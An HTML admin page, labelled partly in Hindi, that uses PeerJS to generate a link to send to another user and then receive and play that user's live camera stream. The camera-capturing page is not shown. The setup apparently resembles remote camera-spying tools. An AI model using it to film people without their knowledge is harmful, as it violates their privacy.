<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Live Camera</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #fff; text-align: center; margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: auto; background: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.6); }
        h2 { margin-top: 0; color: #4facfe; }
        .link-box { background: #2d2d2d; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #444; }
        input { width: 75%; padding: 12px; font-size: 14px; border-radius: 6px; border: 1px solid #555; background: #222; color: #fff; outline: none; }
        button { padding: 12px 20px; font-size: 14px; cursor: pointer; background: #4facfe; color: #fff; border: none; border-radius: 6px; font-weight: bold; transition: 0.3s; margin-left: 10px; }
        button:hover { background: #00f2fe; color: #000; }
        video { width: 100%; max-height: 500px; background: #000; margin-top: 20px; border-radius: 8px; border: 2px solid #4facfe; }
        #status { font-weight: bold; color: #ff9800; padding: 10px; display: inline-block; }
        #log-box { margin-top: 20px; background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 15px; text-align: left; height: 150px; overflow-y: auto; border-radius: 6px; font-size: 13px; border: 1px solid #333; }
    </style>
</head>
<body>
    <div class="container">
        <h2>💻 Admin Live Viewer</h2>
        <div id="status">Connecting to secure server...</div>

        <div class="link-box" id="link-container" style="display: none;">
            <p style="margin-top: 0; color: #ccc;"><strong>यह लिंक यूज़र को भेजें:</strong></p>
            <div style="display: flex; justify-content: center; align-items: center;">
                <input type="text" id="share-link" readonly>
                <button onclick="copyLink()">Copy Link</button>
            </div>
        </div>

        <video id="remote-video" autoplay playsinline muted controls></video>

        <div id="log-box">> System Initialized...<br></div>
    </div>

    <script>
        function log(msg) {
            const logBox = document.getElementById('log-box');
            logBox.innerHTML += `> ${msg}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        // STUN Servers for bypassing mobile network blocks
        const peer = new Peer({
            config: {
                'iceServers': [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            }
        });
        
        peer.on('open', (id) => {
            log(`✅ Server Connected! Admin ID: ${id}`);
            const statusEl = document.getElementById('status');
            statusEl.innerText = "✅ Online & Ready";
            statusEl.style.color = "#4caf50";

            let currentUrl = window.location.href.split('?')[0];
            if (currentUrl.endsWith('/')) {
                currentUrl += 'index.html';
            }
            const shareUrl = currentUrl.replace('index.html', `share.html?admin=${id}`);
            
            document.getElementById('share-link').value = shareUrl;
            document.getElementById('link-container').style.display = "block";
        });

        peer.on('call', (call) => {
            log("📞 Incoming connection received...");
            call.answer(); 
            log("✅ Connection accepted.");
            
            call.on('stream', (remoteStream) => {
                log("🎥 Video Stream Received! Playing...");
                const videoEl = document.getElementById('remote-video');
                videoEl.srcObject = remoteStream;
            });

            call.on('error', (err) => log("❌ Call Error: " + err));
        });

        peer.on('error', (err) => {
            log(`❌ System Error: ${err.type}`);
        });

        function copyLink() {
            const copyText = document.getElementById("share-link");
            copyText.select();
            document.execCommand("copy");
            alert("✅ Link Copied Successfully!");
        }
    </script>
</body>
</html>
